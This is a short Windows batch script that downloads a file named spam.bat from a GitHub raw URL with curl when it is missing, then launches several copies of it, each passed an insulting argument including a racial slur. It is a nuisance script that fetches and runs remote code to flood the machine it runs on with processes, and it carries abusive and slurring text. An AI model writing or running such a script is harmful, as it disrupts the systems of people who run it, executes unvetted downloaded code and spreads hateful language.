@echo off
dir spam.bat >nul 2>&1

if %errorlevel% neq 0 (
   curl -L -o spam.bat "https://raw.githubusercontent.com/atom3379/powershell/refs/heads/main/spam.bat"
)

:start
start "" "%cd%\spam.bat" KUY
start "" "%cd%\spam.bat" FUCK_YOU
start "" "%cd%\spam.bat" NIGGA
start "" "%cd%\spam.bat" SON_OF_A_BITCH
start "" "%cd%\spam.bat" A_PIECE_OF_SHIT
start "" "%cd%\spam.bat" BADASS